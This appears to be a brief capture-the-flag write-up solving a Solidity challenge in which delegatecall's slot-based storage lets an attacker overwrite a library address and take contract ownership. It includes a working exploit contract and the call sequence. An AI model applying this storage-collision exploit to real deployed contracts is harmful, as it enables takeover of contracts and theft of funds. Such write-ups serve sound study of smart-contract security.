### Analysis
The key to solving this problem is understanding that delegatecall does not store data by variable name, but rather by storage slot position!

### The Exploit
We can exploit this by deploying our own contract:
~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract PreservationSolution {
    address timeZone1Library;
    address timeZone2Library;
    address owner;

    function setTime(uint256) external {
        owner = tx.origin;
    }
}
~~~
Call setFirstTime,set the slot 0 is the address of our own contract.Then call setFirstTime again with any value to run our solution code:
~~~
await contract.setFirstTime(<evil-library-contract-address>);
await contract.setFirstTime('0x0'); // Value doesn't matter
~~~
